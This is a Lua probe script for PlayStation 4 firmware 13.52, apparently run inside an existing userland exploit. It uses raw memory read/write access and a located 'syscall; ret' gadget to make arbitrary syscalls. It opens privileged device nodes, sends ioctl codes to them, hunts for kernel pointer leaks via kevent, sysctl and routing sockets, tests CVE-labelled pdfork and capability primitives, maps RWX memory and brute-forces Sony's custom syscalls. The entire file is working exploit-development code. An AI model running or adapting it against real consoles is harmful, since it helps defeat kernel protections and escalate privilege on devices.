-- PS4 FW 13.52 - PROBE v3 (Universal Trampoline)
-- Uses native.fcall_with_rax + syscall gadget for ANY syscall

local mem = rawget(_G, "memory")
local S = rawget(_G, "syscall")
local nat = rawget(_G, "native")

-- Only resolve what we know works
S.resolve({getpid = 20, getuid = 24, close = 6, pipe = 42, open = 5})

local function tonn(v)
  if v == nil then return 0 end
  if type(v) == "table" and v.h then return v.h * 4294967296 + v.l end
  return tonumber(tostring(v or 0)) or 0
end

local function toaddr(v)
  if v == nil then return 0 end
  if type(v) == "table" and v.h then return v.h * 4294967296 + v.l end
  return tonumber(tostring(v))
end

local function find_bytes(w, b1, b2, b3, limit)
  limit = limit or 40
  for i = 0, limit do
    if tonn(mem.read_byte(w+i))==b1 and tonn(mem.read_byte(w+i+1))==b2 then
      if b3 == nil or tonn(mem.read_byte(w+i+2))==b3 then
        return i
      end
    end
  end
  return -1
end

print("============================================")
print("PS4 FW 13.52 - PROBE v3")
print("============================================")

-- Build universal trampoline from getpid wrapper
local w_getpid = toaddr(S.syscall_wrapper[20])
print(string.format("getpid wrapper at 0x%x", w_getpid))

local tramp_off = find_bytes(w_getpid, 0x49, 0x89, 0xCA)
local syscall_off = find_bytes(w_getpid + tramp_off, 0x0F, 0x05)
local tramp = w_getpid + tramp_off + syscall_off
print(string.format("syscall;ret gadget at 0x%x", tramp))

-- Universal syscall
local function sc(scno, a1, a2, a3, a4, a5, a6)
  return tonn(nat.fcall_with_rax(tramp, scno, a1 or 0, a2 or 0, a3 or 0, a4 or 0, a5 or 0, a6 or 0))
end

------------------------------------------------------------
-- SECTION 1: Verify basic syscalls
------------------------------------------------------------
print("\n=== BASIC SYSCALLS ===")
print(string.format("getpid  = %d", sc(20)))
print(string.format("getuid  = %d", sc(24)))
print(string.format("close(-1) = %d (expect -1)", sc(6, 0xFFFFFFFF)))

-- pipe
local pf = mem.alloc(8)
local pr = sc(42, pf)
local prd = mem.read_dword(pf)
local pwr = mem.read_dword(pf + 4)
print(string.format("pipe = %d rd=%d wr=%d", pr, prd, pwr))
sc(6, prd)
sc(6, pwr)

------------------------------------------------------------
-- SECTION 2: Device enumeration
------------------------------------------------------------
print("\n=== DEVICE ENUM ===")
local devs = {
  "/dev/sbi", "/dev/srtc", "/dev/dce", "/dev/dipsw",
  "/dev/dmem0", "/dev/dmem1", "/dev/dmem2", "/dev/dmem3",
  "/dev/dmem4", "/dev/dmem5", "/dev/notification0", "/dev/notification1",
  "/dev/evlg0", "/dev/console", "/dev/sdk_eventlog",
  "/dev/gpu0", "/dev/icc0", "/dev/icc1", "/dev/icc2",
  "/dev/aci0", "/dev/acp0", "/dev/sflash0", "/dev/gbase",
}
local fds = {}
for _, dp in ipairs(devs) do
  local buf = mem.alloc(128)
  for i = 1, #dp do mem.write_byte(buf + i - 1, string.byte(dp, i)) end
  mem.write_byte(buf + #dp, 0)
  local fd = sc(5, buf, 2, 0)
  if fd >= 0 and fd < 1024 then
    print(string.format("  OPEN %s fd=%d", dp, fd))
    fds[dp] = fd
  end
end
print(string.format("Opened %d devices", #fds))

------------------------------------------------------------
-- SECTION 3: ioctl on open devices
------------------------------------------------------------
print("\n=== IOCTL SCAN ===")
local ioctl_codes = {0xc008a801, 0xc010a802, 0xc040a803, 0xc008a804, 0x40105303, 0x40105305, 0x40105309}
for dp, fd in pairs(fds) do
  for _, code in ipairs(ioctl_codes) do
    local iobuf = mem.alloc(256)
    for i = 0, 255 do mem.write_byte(iobuf + i, 0xCC) end
    local r = sc(54, fd, code, iobuf)
    -- Check if kernel wrote data
    local changed = false
    for i = 0, 63 do
      local b = mem.read_byte(iobuf + i)
      if b ~= 0xCC and b ~= 0 then changed = true; break end
    end
    if r ~= -1 or changed then
      print(string.format("  %s ioctl(0x%x) ret=%d [DATA]", dp, code, r))
      local hex = ""
      for i = 0, 31 do hex = hex .. string.format("%02x ", mem.read_byte(iobuf + i)) end
      print(string.format("    hex: %s", hex))
    end
  end
end

------------------------------------------------------------
-- SECTION 4: kqueue + kevent
------------------------------------------------------------
print("\n=== KQUEUE/KEVENT ===")
local kq = sc(362)
print(string.format("kqueue = %d", kq))

if kq >= 0 and kq < 1024 then
  -- EVFILT_USER on PS4 = -7 (0xFFF9)
  local ev = mem.alloc(32)
  for i = 0, 31 do mem.write_byte(ev + i, 0) end
  mem.write_qword(ev + 0, 0x42)
  mem.write_word(ev + 8, 0xFFF9)     -- EVFILT_USER = -7
  mem.write_word(ev + 10, 0x0011)    -- EV_ADD|EV_CLEAR
  mem.write_dword(ev + 12, 0)
  mem.write_qword(ev + 16, 0)
  mem.write_qword(ev + 24, 0)

  local r = sc(363, kq, ev, 1, 0, 0, 0)
  print(string.format("kevent(EVFILT_USER ADD) = %d", r))

  -- Trigger
  mem.write_dword(ev + 12, 0x80000000) -- NOTE_TRIGGER
  r = sc(363, kq, ev, 1, 0, 0, 0)
  print(string.format("kevent(TRIGGER) = %d", r))

  -- Read events
  local out = mem.alloc(256)
  for i = 0, 255 do mem.write_byte(out + i, 0xCC) end
  r = sc(363, kq, 0, 0, out, 4, 0)
  print(string.format("kevent(READ) = %d events", r))
  if r > 0 then
    for e = 0, r - 1 do
      local off = e * 32
      local ident = tonn(mem.read_qword(out + off))
      local filter = mem.read_word(out + off + 8)
      local fflags = mem.read_dword(out + off + 12)
      local data = tonn(mem.read_qword(out + off + 16))
      local udata = tonn(mem.read_qword(out + off + 24))
      print(string.format("  ev[%d]: ident=0x%x filter=%d(0x%x) data=%d udata=0x%x", e, ident, filter, filter, data, udata))
      if udata > 0x80000000 and udata < 0xffff000000000000 then
        print("  *** POTENTIAL KERNEL PTR in udata! ***")
      end
    end
  end

  -- EVFILT_READ on pipe
  local p = mem.alloc(8)
  sc(42, p)
  local prd2 = mem.read_dword(p)
  local pwr2 = mem.read_dword(p + 4)

  local wbuf = mem.alloc(8)
  mem.write_qword(wbuf, 0xDEADBEEFCAFEBABE)
  sc(4, pwr2, wbuf, 8)

  mem.write_qword(ev + 0, prd2)
  mem.write_word(ev + 8, 0xFFFF)  -- EVFILT_READ = -1
  mem.write_word(ev + 10, 0x0001) -- EV_ADD
  mem.write_dword(ev + 12, 0)
  mem.write_qword(ev + 16, 0)
  mem.write_qword(ev + 24, 0)
  r = sc(363, kq, ev, 1, 0, 0, 0)
  print(string.format("kevent(EVFILT_READ pipe) = %d", r))

  for i = 0, 255 do mem.write_byte(out + i, 0xCC) end
  r = sc(363, kq, 0, 0, out, 4, 0)
  print(string.format("kevent(READ after pipe write) = %d events", r))
  if r > 0 then
    local ident = tonn(mem.read_qword(out))
    local filter = mem.read_word(out + 8)
    local data = tonn(mem.read_qword(out + 16))
    local udata = tonn(mem.read_qword(out + 24))
    print(string.format("  ident=%d filter=%d data=%d udata=0x%x", ident, filter, data, udata))
    if udata > 0x80000000 and udata < 0xffff000000000000 then
      print("  *** KERNEL PTR LEAK via udata! ***")
    end
  end

  sc(6, prd2)
  sc(6, pwr2)
  sc(6, kq)
end

------------------------------------------------------------
-- SECTION 5: pdfork (CVE-2026-45251)
------------------------------------------------------------
print("\n=== PDFORK TEST ===")
local pdfd_out = mem.alloc(8)
mem.write_dword(pdfd_out, 0)
local pd_ret = sc(518, pdfd_out)
print(string.format("pdfork = %d", pd_ret))
if pd_ret == 0 then
  local pd_fd = mem.read_dword(pdfd_out)
  print(string.format("  pd_fd = %d", pd_fd))
  -- Test poll on pdfork fd
  local pollfds = mem.alloc(16)
  mem.write_dword(pollfds, pd_fd)
  mem.write_word(pollfds + 4, 1) -- POLLIN
  mem.write_dword(pollfds + 8, 0)
  local poll_r = sc(143, pollfds, 1, 0)
  print(string.format("  poll(pdfork_fd) = %d", poll_r))
  sc(6, pd_fd)
end

------------------------------------------------------------
-- SECTION 6: sysctl deep scan
------------------------------------------------------------
print("\n=== SYSCTL SCAN ===")
local sysctl_tests = {
  {name = "kern.ostype",      mib = {1, 1}},
  {name = "kern.osrelease",   mib = {1, 2}},
  {name = "kern.version",     mib = {1, 4}},
  {name = "kern.argmax",      mib = {1, 8}},
  {name = "kern.hostname",    mib = {1, 10}},
  {name = "kern.osreldate",   mib = {1, 17}},
  {name = "kern.usrstack",    mib = {1, 32}},
  {name = "kern.ps_strings",  mib = {1, 46}},
  {name = "kern.firmware",    mib = {1, 38}},
  {name = "hw.model",         mib = {6, 2}},
  {name = "hw.ncpu",          mib = {6, 3}},
  {name = "hw.pagesize",      mib = {6, 7}},
  {name = "hw.physmem",       mib = {6, 5}},
}
for _, t in ipairs(sysctl_tests) do
  local mib_buf = mem.alloc(#t.mib * 4)
  for i, v in ipairs(t.mib) do mem.write_dword(mib_buf + (i-1)*4, v) end
  local out_buf = mem.alloc(256)
  for i = 0, 255 do mem.write_byte(out_buf + i, 0) end
  local out_len = mem.alloc(8)
  mem.write_qword(out_len, 256)
  local r = sc(202, mib_buf, #t.mib, out_buf, out_len, 0, 0)
  if r == 0 then
    local actual_len = tonn(mem.read_qword(out_len))
    local str = ""
    for i = 0, math.min(actual_len - 1, 100) do
      local c = mem.read_byte(out_buf + i)
      if c == 0 then break end
      str = str .. string.char(c)
    end
    local num = tonn(mem.read_qword(out_buf))
    print(string.format("  %s = \"%s\" (len=%d, num=0x%x)", t.name, str, actual_len, num))
    if num > 0x80000000 and num < 0xffff000000000000 then
      print("  *** KERNEL POINTER? ***")
    end
  end
end

------------------------------------------------------------
-- SECTION 7: PF_ROUTE socket (CVE-2026-3038)
------------------------------------------------------------
print("\n=== PF_ROUTE TEST ===")
local rt_fd = sc(97, 17, 3, 0) -- AF_ROUTE, SOCK_RAW, 0
print(string.format("PF_ROUTE socket = %d", rt_fd))
if rt_fd >= 0 and rt_fd < 1024 then
  local msg = mem.alloc(512)
  for i = 0, 511 do mem.write_byte(msg + i, 0) end
  mem.write_dword(msg + 0, 92)     -- rtm_msglen
  mem.write_byte(msg + 4, 12)      -- rtm_version
  mem.write_byte(msg + 5, 2)       -- rtm_type = RTM_GET
  mem.write_word(msg + 6, 0x0007)  -- rtm_index
  mem.write_dword(msg + 8, 0x0806) -- rtm_flags
  mem.write_dword(msg + 12, 0)     -- rtm_addrs

  local r = sc(28, rt_fd, msg, 92, 0, msg, 16)
  print(string.format("sendto(RTM_GET) = %d", r))

  local rbuf = mem.alloc(1024)
  for i = 0, 1023 do mem.write_byte(rbuf + i, 0xCC) end
  local from = mem.alloc(16)
  mem.write_byte(from, 16)
  mem.write_byte(from + 1, 17)
  local rlen = mem.alloc(8)
  mem.write_qword(rlen, 16)
  local r2 = sc(27, rt_fd, rbuf, 512, 0, from, rlen)
  print(string.format("recvfrom(RTM_GET reply) = %d", r2))
  if r2 > 0 then
    local kptrs = 0
    for i = 0, math.min(r2 - 8, 256) do
      if i % 8 == 0 then
        local v = tonn(mem.read_qword(rbuf + i))
        if v > 0x8000000000 and v < 0xffff000000000000 then
          kptrs = kptrs + 1
          print(string.format("  *** KERNEL PTR at +%d: 0x%x", i, v))
        end
      end
    end
    local hex = ""
    for i = 0, 63 do hex = hex .. string.format("%02x ", mem.read_byte(rbuf + i)) end
    print(string.format("  hex: %s", hex))
    print(string.format("  kernel ptrs: %d", kptrs))
  end
  sc(6, rt_fd)
end

------------------------------------------------------------
-- SECTION 8: sendmsg/recvmsg (SCM_RIGHTS for UAF)
------------------------------------------------------------
print("\n=== SCM_RIGHTS TEST ===")
local sp = mem.alloc(16)
local sp_r = sc(135, 1, 1, 0, sp)
print(string.format("socketpair = %d", sp_r))
if sp_r == 0 then
  local sp1 = mem.read_dword(sp)
  local sp2 = mem.read_dword(sp + 4)
  print(string.format("  sp1=%d sp2=%d", sp1, sp2))
  -- Close
  sc(6, sp1)
  sc(6, sp2)
end

------------------------------------------------------------
-- SECTION 9: cap_rights (CVE-2026-45251 primitives)
------------------------------------------------------------
print("\n=== CAP_RIGHTS TEST ===")
local cp = mem.alloc(8)
sc(42, cp)
local cp_rd = mem.read_dword(cp)
local cp_wr = mem.read_dword(cp + 4)
print(string.format("pipe fd = %d", cp_rd))

-- cap_rights_limit (533)
local cap = mem.alloc(8)
mem.write_qword(cap, 0x0000000400000003)
local cr = sc(533, cp_rd, cap)
print(string.format("cap_rights_limit(533) = %d", cr))

-- cap_ioctls_limit (534)
local ci = sc(534, cp_rd, 0, 0)
print(string.format("cap_ioctls_limit(534) = %d", ci))

-- cap_ioctls_get (535)
local ci_out = mem.alloc(64)
for i = 0, 63 do mem.write_byte(ci_out + i, 0) end
local cg = sc(535, cp_rd, ci_out, 8)
print(string.format("cap_ioctls_get(535) = %d", cg))
if cg == 0 then
  local val = tonn(mem.read_qword(ci_out))
  print(string.format("  cap_ioctls value = 0x%x", val))
end

sc(6, cp_rd)
sc(6, cp_wr)

------------------------------------------------------------
-- SECTION 10: Memory mapping
------------------------------------------------------------
print("\n=== MEMORY MAPPING ===")
local map = sc(477, 0, 0x4000, 7, 0x1002, -1, 0)
print(string.format("mmap(RWX,16KB) = 0x%x", map))
if map > 0 and map ~= 0xffffffffffffffff then
  mem.write_byte(map, 0x41)
  print(string.format("  read back: %d", mem.read_byte(map)))
end

------------------------------------------------------------
-- SECTION 11: Sony custom syscalls 585-677 scan
------------------------------------------------------------
print("\n=== SONY CUSTOM 585-677 ===")
for scno = 585, 677 do
  local r = sc(scno, 0, 0, 0, 0, 0, 0)
  if r ~= -1 and r ~= 0 then
    print(string.format("  sc%d(0,0,0,0,0,0) = %d (0x%x) [INTERESTING]", scno, r, r))
  end
end

-- Scan with buffer args
print("\n=== SONY CUSTOM 585-677 WITH BUF ===")
local bigbuf = mem.alloc(4096)
for i = 0, 4095 do mem.write_byte(bigbuf + i, 0) end
for scno = 585, 677 do
  local r = sc(scno, bigbuf, 0x1000, 0, 0, 0, 0)
  if r ~= -1 and r ~= 0 then
    print(string.format("  sc%d(buf,4096,0,0,0,0) = %d (0x%x) [INTERESTING]", scno, r, r))
    -- Check if anything was written to buffer
    local changed = false
    for i = 0, 63 do
      if mem.read_byte(bigbuf + i) ~= 0 then changed = true; break end
    end
    if changed then
      local hex = ""
      for i = 0, 31 do hex = hex .. string.format("%02x ", mem.read_byte(bigbuf + i)) end
      print(string.format("  BUFFER: %s", hex))
    end
  end
end

------------------------------------------------------------
-- SECTION 12: poll test
------------------------------------------------------------
print("\n=== POLL TEST ===")
local p = mem.alloc(8)
sc(42, p)
local rd = mem.read_dword(p)
local wr = mem.read_dword(p + 4)
-- Write data
local wbuf = mem.alloc(8)
mem.write_qword(wbuf, 0x4141414141414141)
sc(4, wr, wbuf, 8)
-- Poll
local pollfds = mem.alloc(16)
mem.write_dword(pollfds, rd)
mem.write_word(pollfds + 4, 1) -- POLLIN
mem.write_dword(pollfds + 8, 0)
local pr = sc(143, pollfds, 1, 0)
print(string.format("poll(pipe_rd) = %d", pr))
sc(6, rd)
sc(6, wr)

------------------------------------------------------------
-- SECTION 13: thr_new + context restore (423)
------------------------------------------------------------
print("\n=== THREAD TEST ===")
local thr_out = mem.alloc(8)
local thr_attr = mem.alloc(256)
for i = 0, 255 do mem.write_byte(thr_attr + i, 0) end
mem.write_dword(thr_attr, 0x100000)
mem.write_dword(thr_attr + 4, 1)
local thr = sc(455, thr_attr, 256, thr_out, 0)
print(string.format("thr_new = %d", thr))

------------------------------------------------------------
-- SUMMARY
------------------------------------------------------------
print("\n============================================")
print("PROBE v3 COMPLETE")
print("============================================")
print("SEND THIS OUTPUT TO TERMUX")
print("============================================")
